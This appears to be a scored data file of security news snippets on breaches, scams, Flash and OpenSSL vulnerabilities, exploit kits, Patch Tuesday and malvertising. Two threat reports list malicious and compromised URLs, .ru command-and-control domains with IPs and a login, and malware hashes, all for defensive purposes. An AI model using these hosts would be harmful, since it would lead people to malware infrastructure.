Apple Fixes iOS Lock Screen Bypass that Gives Access to Photos, Contacts. “The bypass technique was discovered by researchers from German security firm Evolution Security and takes advantage of Siri’s integration with apps like Twitter or Facebook and the new 3D Touch feature that’s only available on the iPhone 6s and 6s Plus models. On a locked device, attackers can call up Siri and ask to search for items that contain @ tags using Twitter, Facebook or Yahoo. Then they can locate a string like an email address and use the 3D Touch hard push to bring out the context menu for it.” (Source: PC World)
Official-sounding Calls About an Email Hack. “There’s a new twist on tech-support scams — you know, the one where crooks try to get access to your computer or sensitive information by offering to “fix” a computer problem that doesn’t actually exist. Lately, we’ve heard reports that people are getting calls from someone claiming to be from the Global Privacy Enforcement Network. Their claim? That your email account has been hacked and is sending fraudulent messages. They say they’ll have to take legal action against you, unless you let them fix the problem right away.” (Source: Federal Trade Commission)
FBI: $2.3 Billion Lost to CEO Email Scams. “The U.S. Federal Bureau of Investigation (FBI) this week warned about a ‘dramatic’ increase in so-called ‘CEO fraud,’ e-mail scams in which the attacker spoofs a message from the boss and tricks someone at the organization into wiring funds to the fraudsters. The FBI estimates these scams have cost organizations more than $2.3 billion in losses over the past three years.” (Source: Krebs On Security)
FBI Quietly Admits to Multi-Year APT Attack, Sensitive Data Stolen. “The FBI issued a rare bulletin admitting that a group named Advanced Persistent Threat 6 (APT6) hacked into US government computer systems as far back as 2011 and for years stole sensitive data. The FBI alert was issued in February and went largely unnoticed. Nearly a month later, security experts are now shining a bright light on the alert and the mysterious group behind the attack.” (Source: Kaspersky’s ThreatPost)
Thousands of Login Details Stolen from National Childbirth Trust by Cyber Thieves. “A London-based childbirth charity has admitted that over 15,000 parents have been caught up in a data breach after hackers were able to compromise usernames and passwords from its website. The National Childbirth Trust (NCT), which provides help and support to hundreds of thousands of parents during the childbirth process, has sent a message to those affected explaining their email addresses, usernames and passwords have been hijacked.” (Source: International Business Times)
Rio Olympics Expected to be a Cybercrime Bonanza. “Like all too many Brazilians, Graziela di Giorgio clicked where she shouldn’t have. And just like that, her credit card was cloned.” (Source: CBC News)
Millions of Child Support Records Stolen, D.C. Officials Want Answers. “In early February, a thief broke into several offices in Olympia, Washington to steal anything he could grab that was worth selling. In one locked drawer, the thief found a couple of external hard drives that he added to his haul of cash, cameras, electronics and laptops. The hard drives belonged to the local office of the Administration for Children and Families, part of the Department of Health and Human Services, and contained between two and five million records related to child-support audits.” (Source: CSO Online)
Inconsistent API Security Puts App Economy At Risk. “As APIs increasingly serve as the essential glue in today’s app economy, many enterprises are struggling to keep pace with a consistent API-security strategy, according to a survey out today by Ovum on behalf of Distil Networks. And with many APIs intentionally made public to the outside world, a lack of a singular strategy could be adding undue risk in the wake of innovation and open development communities.” (Source: Dark Reading)
5 Ways to Become a Smaller Target for Ransomware Hackers. “Hacking for ransom is on the rise — on pace to beat out last year’s figures — and hits people where it hurts, locking them out of files, photos and critical records until they pay hackers a bounty to restore their access. Hackers bait users to click on infected email links or open infected attachments, or they take advantage of outdated and vulnerable systems.” (Source: The News and Advance)
An Overlooked Insider Threat? Many Fear Vendor-Related Breach: Survey. “Companies trust and increasing reliance on vendors belies apprehension over their cyberthreat exposure, according to Bomgar’s Vendor Vulnerability report, which surveyed 608 decision makers with IT roles in various companies across United Kingdom, the United States, Germany and France. The report found that while  almost all (92 percent) companies trust vendors, more than one-third noted they suffered a breach because of a vendor’s access to their networks and systems over the past year.” (Source: Legal Tech News)
1 in 5 Enterprises Admit of Mobile Data Breach Resulting from BYOD. “A survey from conducted by Crowd Research Partners and sponsored by six data security vendors finds that nearly one out of five organizations (21 percent) experienced a security breach through the use of BYOD or corporate-owned mobile devices, primarily due to connections to malicious malware and Wi-Fi hotspots.” (Source: India Times)
Almost Half of Dropped USB Sticks will Get Plugged In. “People are still plugging in USB sticks scattered around parking lots, a new study has confirmed. This time, the researchers hail from the University of Illinois. They decided to test what they call the “anecdotal belief” that people pick these things up and plug them in, so they dropped 297 drives on the school’s Urbana-Champaign campus last year.” (Source: Sophos’ Naked Security Blog)
Who Owns Corporate Data? Employees Think They Can Just Take It. “A third of all employees believe they own – or share ownership of – the corporate data they work on, with half thinking they can take the data with them when they leave, according to Veriato. These findings likely result from a massive disconnect, or lack of education, on who owns the data or any consequences for taking it—with nearly 60 percent of the 400 random employees surveyed saying they have never signed a confidentiality agreement or they never even knew one existed.” (Source: Help Net Security)
Latest Tax-related Data Breach could Affect Employees and Their Children. “A breach notification letter, submitted on April 6 to California and Vermont, says that on March 8, a vendor hired to perform tax services for Whiting-Turner noticed suspicious activity on their systems. Around the same time, Whiting-Turner employees reported fraudulent tax filings in their names. The construction firm shutdown the vendor’s access to their systems and launched an investigation. The investigation is ongoing, but the notice was issued out of an abundance of caution, the company says.” (Source: CSO Online)
One in Two Children Hide Risky Online Behavior from Parents – Kaspersky Lab Research. “According to a survey conducted by Kaspersky Lab and the icon Kids & Youth agency, almost half of children (44%) hide potentially dangerous online activity from their parents. The older the child, the more he or she hides. At the age of 8-10 only a third (33%) of children do not inform their parents about incidents on the Web, but that number rises to 51% for teens aged 14-16.” (Source: Tempo)
WhatsApp Encryption A Good Start, But Far From a Security Cure-all. “WhatsApp’s addition of end-to-end encryption is a good start, but does not present users with a complete solution that protects against the prying eyes of intrusive governments and nosey third-parties. That’s the consensus among privacy and security experts that commend Facebook-owned WhatsApp for flipping the switch on end-to-end encryption for its one billion users worldwide. But they say there is more work to be done when it comes to securing digital communication.” (Source: Kaspersky’s Threat Post)",0.013396980545643977
"Safe surfing, everyone!
The Malwarebytes Labs Team
",0.01166910416539002
"Patch Now – Adobe Vulnerabilities Under Attack
This has not been a great week for Adobe; they have been scrambling to fix a number of critical vulnerabilities in their Flash Player product that are being used in active attacks. But a patch is now available to cover all these vulnerabilities - so patch now!",0.014328198642770129
6 Feb 2015 - 05:45PM,0.011707821689084241
This has not been a great week for Adobe; they have been scrambling to fix a number of critical vulnerabilities in their Flash Player product that are being used in active attacks. But a patch is now available to cover all these vulnerabilities – so patch now!,0.013438454832093605
"This has not been a great week for Adobe; they have been scrambling to fix a number of critical vulnerabilities in their Flash Player product that are being used in active attacks. Two weeks ago, Adobe released a patch for a vulnerability that is being used in attacks in the wild (CVE-2015-0310). A few days later, they released yet another patch for a second vulnerability also being used in active attacks (CVE-2015-0311). And a few days after that, they released a patch for yet another vulnerability that is also being exploited in the wild (CVE-2015-0313).",0.020647654519594383
"While the latest patch is for Windows and Mac users, the previous two patches from Adobe are for Windows, Macs and Linux. All three vulnerabilities are being exploited via drive-by-download attacks. These attacks are a popular type for criminals as they can potentially provide a more “operating system agnostic” attack vector, since it has the potential for affecting more than one OS. And indeed, that is the case here.",0.009739290593428707
"This series of rapid-fire updates serves as reminder to enable automatic updates when you can, especially for popularly targeted browser plugins like Java and Flash. You may also wish to enable “click to play” functionality in your browser of choice, or install a “click to play” plugin from a reputable vendor and app store, as this sort of attack continues to be quite common.",0.00888200923392024
"It’s certainly understandable if you’re experiencing a bit of update fatigue from all this, and wondering if these are all indeed valid notifications. If you are unsure if you have the latest version of Flash Player, Adobe has a website where you can check this. If you have disabled Flash Player except for occasional use, you will need to temporarily enable it for this test to work. If you use multiple browsers, please check the update levels for all your browsers. If you do not have Flash Player installed, you needn’t worry about this. For the last several years, Flash has been becoming a less common browser plugin – and YouTube just chose to switch away from Flash to HTML5. If you have not needed it so far, you’re unlikely to need it now. As criminals love to disguise malware as Flash Player updates, you should only get plugin updates directly from the Adobe website.
",0.009830154981477102
"Remember the ‘LinkedIn Invitations’ themed malware campaign which I profiled in March, 2012?",0.010893235691436853
"A few hours, ago, the cybercriminals behind it launched another round of malicious emails to millions of end and corporate users.
More details:",0.01722176127733066
"Once the user clicks on the link (hxxp://hseclub.net/main.php?page=d72ac4be16dd8476), a client-side exploit, CVE-2010-1885 in particular, will attempt to drop the  following MD5 on the affected host, MD5: 66dfb48ddc624064d21d371507191ff0
Upon execution the sample attempts to connect to the following hosts:",0.0074273681588128415
"janisjhnbdaklsjsad.ru:443 with user janisjhnbdaklsjsad.ru and password janisjhnbdaklsjsad.ru – 91.229.91.73, AS50939, SPACE-AS
sllflfjsnd784982ncbmvbjh434554b3.ru – 91.217.162.42, AS29568, COMTEL-AS
kamperazonsjdnjhffaaaae38.ru – 91.217.162.42, AS29568, COMTEL-AS
iiioioiiiiooii2iio1oi.ru – 91.217.162.42, AS29568, COMTEL-AS",0.014421429280578102
"Another malware with MD5: 4b1fce0f9a8abdcb7ac515d382c55013 is known to have used one of these C&C domains in the past, janisjhnbdaklsjsad.ru in particular.
Webroot SecureAnywhere users are protected from this threat.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.009580980575282227
"Adobe warns of Flash zero‑day vulnerability, being actively exploited by online criminals
Adobe Flash users find themselves in danger once again, as they wait for an emergency security patch to fix a vulnerability being actively exploited in the wild.",0.013138751091391176
Graham Cluley,0.010131928644261823
12 May 2016 - 11:44AM,0.010456289373322103
"Adobe Flash users find themselves in danger once again, as they wait for an emergency security patch to fix a vulnerability being actively exploited in the wild.",0.013872215429273527
"As I write this, if you’re running Adobe Flash on your Windows, Mac, Linux or Chrome OS computer you’re potentially at risk.",0.012199412660868991
"Adobe has issued a security advisory, warning of an as-yet unpatched critical security hole in its popular Flash player software that is reported to being actively exploited by criminals in the wild.",0.014999737229844379
"No detailed information about the Flash zero-day exploit (known as CVE-2016-4117) has yet been released. However, I don’t think anyone would be surprised if we heard that the unpatched vulnerability was being exploited in malvertising campaigns or watering hole attacks, perhaps in co-ordination with something like the notorious Angler Exploit Kit.",0.014526557185826405
"No doubt we will learn more about the nature of the attacks in the coming days, as Adobe says that it hopes to release a security update for the software this week (most likely it will arrive later today).",0.016874383456314757
For now all we know are the curt details shared by Adobe in its advisory:,0.010792515693851312
"A critical vulnerability (CVE-2016-4117) exists in Adobe Flash Player 21.0.0.226 and earlier versions for Windows, Macintosh, Linux, and Chrome OS. Successful exploitation could cause a crash and potentially allow an attacker to take control of the affected system.",0.015271629926578045
"Obviously it makes sense to run a layered defence on your computer systems, which includes keeping your anti-virus and other software updated.",0.0168817747925879
"But more than that, you may wish to take this opportunity to consider your relationship with Adobe Flash – which has been troubled with flaws and malicious attacks many times over the years.",0.012032031097618412
"Even if you’re not ready to completely uninstall Flash, you may wish to consider enabling “Click to Play” in your browser to reduce your attack surface.",0.01142368386810233
"With “Click to Play” enabled, your browser won’t render potentially malicious Flash content unless you give it the go-ahead. In other words, a maliciously coded Flash file will not execute unless you give it explicit permission, rather than automatically running when you visit a poisoned webpage.",0.012585356040847429
"If you decide to keep Flash, make sure that it is being kept up-to-date on your computers. You can either rely on Adobe’s own automatic updates (which I find are sometimes rather slow to register that there is a new version available) or trigger one manually.",0.012261726600550027
"If in doubt, you can always check which version of Flash you have installed and find the most recent version of Flash on Adobe’s download page.",0.012902073891183585
"Mark James, security specialist at ESET UK, offers the following advice:",0.01999451372154415
“Adobe flash is still found on way too many machines. It’s one of those programs that’s often not actually used as many vendors see it as a huge security problem. The program itself is one of many that users will leave on their machine without actually using it or understanding the security risk. As with all software these days you need to keep them on the latest versions or better still uninstall it if you don’t need it. Having a regular updating Internet security product will help to keep you safe.”,0.015936977687676768
"Oh, and if you don’t use Adobe Flash don’t feel too smug. There are plenty of other critical security vulnerabilities being found in software from other vendors all the time.",0.01275543681719804
"Just this week, for instance, Microsoft released an urgent fix for a zero-day vulnerability in its JScript and VBScript engines, used by the likes of Internet Explorer, and thought to have been used in targeted attacks against South Korea.
",0.013078732653058811
"Cybercriminals have launched yet another massive spam campaign, this time impersonating AT&T’s Billing Center, in an attempt to trick end and corporate users into downloading a bogus Online Bill.
Once gullible and socially engineered users click on any of the links found in the malicious emails, they’re automatically redirected to a Black Hole exploit kit landing URL, where they’re exposed to client-side exploits, which ultimately drop a piece of malicious software on the affected hosts.
More details:",0.012876853478279826
Screenshot of the spamvertised email:,0.01024206182675269
"Spamvertised compromised URls: hxxp://fitlyspoken.org/wp-admin/atbilred.html; hxxp://tomruff.net/wp-admin/atbilred.html; hxxp://skiclub-marbach.ch/modules/atbilred.html; hxxp://patientshealthtips.com/wp-admin/atbilred.html; hxxp://ecmconnection.com.br/banners/atbilred.html; hxxp://ooesv.at/modules/atbilred.html; hxxp://jaguarloszer.eu/css/atbilred.html; hxxp://andrevanos.nl/robeco/atbilred.html; hxxp://argusoft.de/ak/atbilred.html; hxxp://adviko.ru/doc/atbilred.html; hxxp://issueswithaging.com/wp-content/plugins/zeaaiumxqqi/atbilred.html; hxxp://montecorneo.com/images/atbilred.html; hxxp://qisas.com/wp-admin/atbilred.html; hxxp://elecok.de/modules/atbilred.html; hxxp://odessa-ua.net/modules/atbilred.html; hxxp://ezitis.lv/wp-admin/atbilred.html; hxxp://lostsoul.ro/wp-content/plugins/zdopwbrdkyv/atbilred.html; hxxp://masoncerbone.com/wp-content/plugins/zeeyseapoee/atbilred.html; hxxp://deafplus.us/wp/wp-content/plugins/zfoorahmuib/atbilred.html; hxxp://hexbugnano.co.uk/wp-content/plugins/zexjtehgupg/atbilred.html; hxxp://ecmconnection.com.br/banners/atbilred.html
Client-side exploits serving URL: hxxp://advancementwowcom.org/main.php?page=19152be46559e39d
Client-side exploits served: CVE-2010-1885
Upon successful client-side exploitation, the campaigns drops MD5: c497b4d6dfadd4609918282cf91c6f4e on the infected hosts, currently detected by 19 out of 41 antivirus scanners as Trojan.Generic.KD.687203; W32/Cridex-Q.
Once executed, the sample phones back to hxxp://87.204.199.100:8080/mx5/B/in/. We’ve already seen the same command and control served used in several malware-serving campaigns, namely, the Craigslist spam campaign, the PayPal spam campaign, the eBay spam campaign, and the American Airlines themed spam campaign.
As we already predicted, cybercriminals will continue rotating popular brands, introduce new email templates, and newly undetected pieces of malware in an attempt to achieve a higher click-through rate for their malicious campaigns.
AT&T outlines this threat on their site.
Webroot SecureAnywhere users are proactively protected from this threat.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.01280196423617519
"OpenSSL Update Released for ""Alternative chains certificate forgery"" Vulnerability",0.006076497309200346
"<p>
Websense&reg; Security Labs&trade; have, since Monday 6 July, been looking out for details of an anticipated release to the OpenSSL open source toolkit for SSL/TLS.</p>
<p>
Today (9 July 2015) the OpenSSL Project released an update to the popular toolkit detailed in the Security Advisory available here:&nbsp;<a href=""https://www.openssl.org/news/secadv_20150709.txt"">https://www.openssl.or...
<p>
<img alt="""" src=""/sites/default/files/blog/legacy/1307.openssl_cve20151793.png-550x0.png"" style=""height:190px; width:549px"" /></p>
<p>
The advisory details an implementation error in the logic around certificate chains.&nbsp; The so-called &quot;Alternative chains certificate forgery&quot; issue permits an attacker to bypass certain checks enabling them to use a valid leaf certificate to act as a CA (Certificate Authority) and generate certificates.</p>
<p>
The issue has been assigned CVE-2015-1793 and is classified as &quot;High&quot; severity.</p>
<p>
If you are using one of the affected versions of OpenSSL (1.0.2c, 1.0.2b, 1.0.1n and 1.0.1o) we encourage you to consider applying the latest version of OpenSSL if applicable to your environment and deployment.&nbsp; The availability details and release notes for OpenSSL v1.0.2d (for example) can be found here:&nbsp;<a href=""https://mta.openssl.org/pipermail/openssl-announce/2015-July/000039.html...
<p>
The advance warning of a forthcoming release was made on 6 July 2015.&nbsp; That is archived here:<a href=""https://mta.openssl.org/pipermail/openssl-announce/2015-July/000037.html...
<p>
It is recommended that users of OpenSSL, and similar toolkits, adopt a process to monitor for such notifications and build a patch management process suitable for their needs.</p>
",0.011827208314352466
Exploit kits: spring 2019 review,0.007535216275740941
"Exploit kit activity remains fairly unchanged since our last winter review in terms of active distribution campaigns. But this spring edition will feature a new exploit kit and another atypical EK, in that it specifically goes after routers.
The main driver behind these drive-by download attacks are various malvertising chains with strong geolocation filtering. This explains why some exploit kits will be less visible than others.
According to our telemetry, the US is by far the country most affected by exploit kits, while Spain and South Korea are leading in Europe and Asia, respectively.",0.012389140769028195
"Spring 2019 overview
Spelevo EKFallout EKMagnitude EKRIG EKUnderminer EKRouter EK
Vulnerabilties
Internet Explorer’s CVE-2018-8174 and Flash Player’s CVE-2018-15982 are the most common vulnerabilities, while the older CVE-2018-4878 (Flash) is still used by some EKs.
Spelevo EK
Spelevo EK is a new exploit kit that was identified in March 2019 and features the most recent Flash exploit (CVE-2018-15982). Based on our internal tests, Spelevo’s Flash exploit will check for and avoid virtual machines before delivering its payload.",0.011581877033169596
"Payloads seen: PsiX Bot, IcedID
Fallout EK
Fallout EK is one of the more active exploit kits with some of the more intricate URI patterns. For a while, Fallout was loading its IE exploit via a GitHub PoC, but it eventually switched back to self-hosting.",0.010275867713587017
"Payloads seen: GandCrab, Raccoon Stealer, Baldr
Magnitude EK
Not a lot has changed for Magnitude EK during the past few months, as it continues to target a few Asia Pacific (APAC) countries, and exclusively drops its own Magniber ransomware.",0.017516482045041082
"Payload seen: Magniber ransomware
RIG EK
RIG EK is also one of the popular exploit kits enjoying a wide distribution via malvertising campaigns, such as Fobos. RIG still uses Flash’s CVE-2018-4878, which comes with its own artifacts.",0.010310995066051376
"Payloads seen: AZORult, Pitou, ElectrumDoSMiner
Underminer EK
Underminer EK is distinct from its counterparts for its overkill obfuscation of Internet Explorer and Flash exploits, but more importantly for its unorthodox Hidden Bee payload.",0.015109637108734253
"Payload seen: Hidden Bee
Router EK
Router exploit kits are not new (see DNSChanger EK), but they are quite dangerous, as they are part of drive-by attacks that alter your router’s DNS settings via cross-site request forgery (CSRF). The particular one we show here (Novidade) targets Brazilian users. The end goal is typically to redirect users to phishing websites with victims being none the wiser.",0.011887855090818578
"Payload seen: DNS changer
Mitigation
Malwarebytes users are protected against these exploits kits, thanks to our anti-exploit and web protection technologies. The animation below features Malwarebytes Endpoint Protection and Response, one of our business products, and shows how it blocks each of these attacks.
",0.011530879069049482
"What you need to know for Patch Tuesday, August 2018",0.010514360959677171
"With 23 critical vulnerabilities addressed in patches from Microsoft and Adobe, August is turning out to be a good month for updates -- but don't delay installing them.",0.015560313598000364
"Written by
Andrew O'Donnell,",0.00912556067984216
Andrew Brandt,0.008937450115869772
"August 17, 2018",0.00893376358149589
SophosLabs Uncut Acrobat Adobe Flash Microsoft Office Patch Patch Tuesday PDF Reader updates Vulnerabilities vulnerability Windows Windows Update,0.009262079695539271
"By Andrew O’Donnell and Andrew Brandt
This week, Microsoft and Adobe released their monthly security updates for August. This month’s fixes address a host of vulnerabilities that affect Windows and a panoply of software that runs on Windows, including the IE and Edge browsers, Microsoft Office, Visual Studio, Microsoft’s ChakraCore JavaScript engine, and Adobe Reader, Acrobat, and Flash.
The company also released new patches that update a mitigation fix released earlier this year to prevent newly discovered types of so-called speculative execution side channel attacks (popularly known as Spectre and Meltdown) that could affect computers running AMD, ARM, and Intel processors.
While there’s been some scuttlebutt about the CPU performance hit that Spectre and Meltdown patches could impose on users, Microsoft wrote that “for most consumer devices, we have not observed a noticeable performance impact after applying the updates.” This month, the patches for this vulnerability were released for a wide range of Windows versions, from the newest 64-bit Windows 10 to the 32-bit versions of Windows Server 2008 and Windows 7, as part of their normal update bundle.
All told, this is a good month for killing bugs. The patches fix:",0.012391650384887987
"64 vulnerabilities affecting a wide range of Microsoft products, with 21 of those classified as Critical.
11 vulnerabilities in various Adobe applications, with 2 classified as Critical.",0.013727920359170698
"A typical Windows 10 machine will receive updates designed to address 17 vulnerabilities that could affect the platform, including two rated by Microsoft as Critical. The critical updates address issues involving the use of maliciously crafted Windows font files (which could be used either in a webpage or embedded in an Office document) and the use of maliciously crafted Windows shortcuts (or .LNK files) to perform remote code execution. Of course, the specific updates your computer will receive will depend on what you’re running.
While both of these types of attacks could be potentially devastating, Microsoft indicated that, to the best of their knowledge, these particular attacks have not been seen in the wild yet, because the company became aware of the vulnerabilities when security researchers responsibly disclosed the bugs to them through a bug bounty program.
What Adobe fixed in their updates
Based on our analysis of the information provided by Adobe about the fixes they also released on Tuesday, Sophos believes that the updates affecting Adobe Reader, Acrobat, and Flash (specifically, version 30.0.0.134 or earlier) require special attention and action if you have any of those programs on your computer, as many people do. Adobe also released updates for its Creative Cloud and Experience Manager packages.
Flash, being a cross-platform utility, has been updated for the IE, Edge, and Chrome browsers, as well as for MacOSX and Linux. The update addresses five vulnerabilities that, if executed successfully, “could lead to arbitrary code execution in the context of the current user,” Adobe wrote. All of the vulnerabilities were responsibly disclosed to Adobe and have not been seen in the wild yet, so they only rate a threat level of “important.”
The fix for the three most recent versions of Acrobat DC and Reader DC addresses two vulnerabilities both rated as critical by Adobe. Either one of the bugs could permit a bad actor to arbitrarily launch code on the victim’s computer.
The following Acrobat products are affected:
Adobe Acrobat (APSB18-29):",0.009630801553113022
"Acrobat DC with 2018.011.20058 and earlier versions
Acrobat Reader DC with 2018.011.20058 and earlier versions
Acrobat 2017 with 2017.011.30099 and earlier versions
Acrobat Reader 2017 with 2017.011.30099 and earlier versions
Acrobat DC 2015.006.30448 and earlier versions
Acrobat Reader DC 2015.006.30448 and earlier versions",0.020328811085713605
"How is Sophos responding to these threats?
Sophos has released the following new detections to address some of the specific vulnerabilities mentioned above; Others may already be covered by existing detections. Additional detections may (and probably will) be released in the future.
Note: CVE-2018-8414 is also known as the SettingContent-ms vulnerability, that we previously blogged about:",0.008656796954423451
"CVE
SAV
IPS
Intercept-X",0.010185298729769032
"CVE-2018-12799
Exp/201812799-A
sid:46651
N/V",0.010050124968528973
"CVE-2018-12824
Exp/201812824-A
sid:2200850
N/V",0.010196082249714022
"CVE-2018-12826
SID
sid:2200851
N/V",0.008059249233699828
"CVE-2018-8414
Exp/20188414-A
Mal/PdfMsc-A
CXmail/PDFStn-A
sid:2200854
Application Lockdown",0.010497266906068115
"N/V = Not Validated. The proof-of-concept (PoC) code provided with MAPP advisories does not include active exploits, and as such is not applicable to Intercept X testing. The IX ability to block the exploit depends on the actual exploit weaponization approach, which we won’t see until someone spots it in the wild. The SAV and IPS detections developed for the PoCs do not guarantee interception of in-the-wild attacks.
SID = silent identity to gather telemetry data (this may not be shown under SAV column in the table if we have full detection.)
How long does it take to have Sophos detection in place?
We aim to add detection to critical issues based on the type and nature of the vulnerabilities as soon as possible. In many cases, existing detections will catch exploit attempts without the need for updates.
What if the vulnerability/0-day you’re looking for is not listed here?
If we haven’t released an update for a specific exploit, the most likely reason is that we did not receive the data that shows how the exploit works in the real world. As many of this month’s exploits were crafted in a lab and have not been seen in the wild, nobody has enough information (yet) about how criminals would, hypothetically, exploit any given vulnerability. If or when we receive information about real attacks, we will create new detections, as needed.",0.010514429965201577
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
VB2016 paper: Uncovering the secrets of malvertising,0.008242979887364776
Jérôme Segura,0.010696515473316515
"Malwarebytes, USA",0.008474819881768458
Chris Boyd,0.009257907105157615
"Malwarebytes, UK",0.009261098844094096
Copyright © 2016 Virus Bulletin,0.009767502707145992
"Table of contents
Abstract Introduction Ad tech 101 Concepts Weaknesses Types of malvertising Misconceptions about malvertising Desktops Mobile Ad/click fraud Malware Playing in the shadows Fake profiles Domain shadowing SSL challenges Micro targeting and fingerprinting Fingerprinting Origins Current use in adverts Hiding in a GIF The future of online ads Conclusion References",0.014646333438616765
Abstract,0.009485057568311417
"Malicious advertising, a.k.a. malvertising, has evolved tremendously over the past few years to take a central place in some of today's largest web-based attacks. It is by far the tool of choice for attackers to reach the masses but also to target them with infinite precision and deliver such payloads as ransomware.",0.012436714556561146
"The complexity and layered structure of the ad industry has provided the perfect ground for rogue actors to game the system and create long-lasting campaigns that go almost unnoticed. Indeed, by using a combination of social engineering and technical tricks, fraudulent advertisers are able to enter ad platforms and push their malicious code.",0.015059703664561663
"While the debate about ad blockers continues to rage, malvertising will continue to make headlines for the foreseeable future – which is why it is important to stay up to date with its latest practices.",0.016415311117640607
In this paper we will look at:,0.009080941406784837
"Ad tech 101: core concepts (programmatic, RTB, CPM) that are necessary to understand how and why online criminals leverage the ad ecosystem to their advantage.",0.01969583459131985
"Types of malvertising by category (scams, ad fraud, malware) and platform (mobile, desktop).",0.020087064066673488
Playing in the shadows: how fraudulent advertisers use social engineering against ad platforms.,0.020356238727349152
Fingerprinting and other tricks that leave security scanners in the dark.,0.01764506550802669
"The future of online ads: ad fraud, ad blockers and malvertising are serious issues the ad industry needs to overcome if it wants to survive.",0.02141319882718873
Introduction,0.012036720276026314
Malvertising regularly makes the news with some big name sites unwittingly exposing their visitors to malware because of malicious ad banners [1].,0.019946600812840942
"The term 'malvertising' was coined in 2007 [2], but the problem has been going on for more than a decade [3]. Over the years, the model has not changed much, in the sense that ad banners carried malicious code then and still do now. In fact, the ad tech industry has only become more complex and malvertising more prevalent.In this paper, we take a quick – but necessary – look at some of the ad industry's basic concepts and explore in more detail where current business practices fall short.",0.015805148220277898
"We also show how malvertising, which can target multiple different platforms and take various shapes, is still largely misunderstood. For instance, according to a survey by botlab.io, 60% of people think that in order for an online advertisement to send malware, the user has to click on the ad first [4].",0.014231720907081247
"In the meantime, threat actors are taking on multiple identities and hiding their traces thanks to clever fingerprinting, enabling adverts to act as a direct gateway to exploit kits.",0.012227936653816718
"In this bleak context, we take a look at what the future of online ads may be like and how criminals will adapt in creative ways to keep milking the system.",0.01249406894433902
Ad tech 101,0.009981408665513447
"In order to grasp why malvertising is such a profitable and efficient way to distribute malware, it is important to have a basic understanding of how the ad industry works.",0.01603711542210262
"As a malware researcher this may feel unnatural, but let's keep in mind that threat actors are savvy advertisers, albeit rogue ones, who have mastered the art of abusing the ad tech industry. Even a basic knowledge of the ad ecosystem really helps to track and guess the malvertisers' next move.",0.015435929611832488
Concepts,0.007726598067614776
"The ad industry is a complex and extremely powerful machine where automation, also known as programmatic, is key to allowing the buying and selling of ad space in real time.",0.01546167796799347
"Each time a user browses to a website (publisher), an auction takes place to display an advert (impression) that is customized for this particular user. This process, also known as Real Time Bidding (RTB), happens within milliseconds and is, of course, fully automated. Advertisers compete for each impression and the highest bidder typically wins the auction and gets to have its creative (the advert) displayed on the publisher's website.",0.025550076443077163
"Leveraging the depth of ad platforms, advertisers can precisely target potential customers by age, income, geolocation, operating system, and many more pieces of information which would likely frighten privacy-conscious users. Better targeting means better monetization downstream, which ironically is also true for the criminal enterprise.",0.01872802589319389
"One little known fact is how cheap advertising can be, especially when it is targeted effectively. This is measured by the CPM (cost per thousand impressions) and essentially means that an advertiser can display an ad banner to a thousand visitors for anywhere between a few cents and a few dollars.",0.018064201440593397
"While RTB is the basic concept upon which advertising relies, there are many other processes involved within the ad ecosystem that have grown out of an ever-evolving need to monetize Internet content. Often, security researchers will witness new incidents abusing something they haven't seen before, simply because the surface of attack is so large.",0.01333387466473357
Weaknesses,0.007727689709711383
There are several ways threat actors can place a malicious advert but generally they fall into one of following scenarios:,0.015386217445495176
"Compromising a legitimate advertiser/ad agency account, or even their server.",0.013237812642509117
Registering a new account on an ad platform and serving malicious code.,0.013421601098774105
Pretending to be an agency or representative of a legitimate brand.,0.01615342709694423
The latter two are by far the most common because they do not require any type of hacking and instead leverage the inherent weaknesses of the ad ecosystem.,0.012113856057395789
Table 1 shows the pros and cons of various practices observed in the ad industry. Please note that these greatly vary from one ad network or platform to the next and should not be generalized as the default standard.,0.01269408477637568
Practices,0.009206126588186425
Pros,0.008744116929347956
Cons,0.011032131815201796
Ads automatically served in real time,0.009481212399193417
"No human interaction, fast and cheap",0.011035382902636282
"Lack of validation, attacks happen and are only stopped after the fact",0.007854168101714354
Detailed user profiles,0.008747430257769806
Companies get a greater return for their ad budget,0.011373214918288688
Criminals can narrow down who their victims are,0.011169111010878363
Billions of ad impressions,0.01262080624445594
This an extremely lucrative industry,0.008747304442377035
"Volume brings complexity, attackers can hide in the noise",0.010265748196616409
"Third-party advertising, arbitrage",0.01046829504302893
"Flexibility for ad buyers, possibility of reselling for profit",0.009577072316454216
"Difficulty tracking who is serving what, and who takes responsibility",0.00972452232421539
Self-serve platform,0.0072207491425417825
Easy and cheap to use,0.008419258822257358
"Very little oversight, huge risk for abuse",0.007399390175124476
"Easy sign-ups, low minimum budget required",0.01037513562395087
"Convenient for new advertisers, or those with low budgets",0.01080562172191879
Fraudulent advertisers can easily get onto ad platforms and have little to lose if caught,0.010939556807444739
Vetted partners,0.007771084998304034
A vetted partner relationship helps both parties deal efficiently and trust each other,0.009719654902997088
A vetted partner can still serve malware and the lack of scrutiny can actually backfire,0.00733352763319417
Low CPM,0.009519820319910832
Ability to target millions of users with relative cheap cost,0.007451610285467036
Cost-effective method to infect scores of people,0.009161426816331142
Rich content,0.008764548269128314
"Images, videos are and other types of animations make ads more engaging",0.011281312509563768
"Malicious code is more likely to be embedded in rich content, than a simple text-based advert",0.008910384109727998
"Third-party JavaScript tags, containers",0.007939326951622916
Advertisers have better tracking mechanisms,0.009253170123881382
Code can be swapped and allows for malicious injections,0.005848048139484807
Self-hosted ad banners,0.009177355751690874
Advertisers have complete control over the content they serve,0.00959704723626087
The advertiser can be rogue or get hacked and serve malicious content directly,0.007731914193323863
Table 1: Pros and cons of practices observed in the ad industry.,0.022055391430084503
"To be fair, no industry is safe from criminal activity. To draw an analogy, credit card companies deal with fraud every single day and yet they are still thriving. However, unlike credit card corporations which can compensate customers for their losses, ad companies are not held liable for any damage to end-users resulting from malvertising attacks.",0.014354078104363843
"To make matters worse, there are practices that are known to be risky, such as arbitrage which involves buying ad space to eventually resell it to another (often less trusted or unknown) buyer. The reality is that there are economic incentives for ad tech players to keep engaging in certain practices despite the risks to end-users. The truth of the matter is that there is often very little validation of the identity of the advertisers who place ads, not to mention that they can easily pick up and start again as another entity.",0.013648229802406875
The complexity and disparity in practices make the ad industry's business model ripe for abuse. Threat actors have understood those weaknesses and have been using them to their advantage while the industry struggles to redefine itself.,0.019420240359638852
Types of malvertising,0.008693485045689897
